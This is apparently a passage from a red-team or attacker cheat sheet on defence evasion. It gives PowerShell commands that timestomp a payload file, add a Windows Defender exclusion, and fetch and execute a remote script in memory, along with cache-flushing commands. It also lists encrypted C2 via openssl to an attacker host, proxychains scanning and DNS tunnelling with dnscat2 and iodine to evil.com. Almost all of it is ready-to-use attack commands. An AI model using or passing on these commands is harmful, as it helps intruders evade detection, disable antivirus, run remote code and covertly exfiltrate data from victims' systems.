  (Get-Item payload.exe).CreationTime = Get-Date "2020-01-01 08:00:00"
  (Get-Item payload.exe).LastWriteTime = Get-Date "2020-01-01 08:00:00"
  # Defender exclusion
  Add-MpPreference -ExclusionPath "C:\Temp"
  # Download cradle (in-memory)
  IEX (New-Object Net.WebClient).DownloadString('http://x/p.ps1')
  # Flush network caches
  ipconfig /flushdns
  arp -d *

NETWORK EVASION QUICK:
  # Encrypted C2
  openssl s_client -connect attacker:443
  # Proxychains
  proxychains nmap -sT -Pn target
  # DNS tunnel tools
  dnscat2 evil.com
  iodine -f -P secret evil.com

KEY TAKEAWAY:
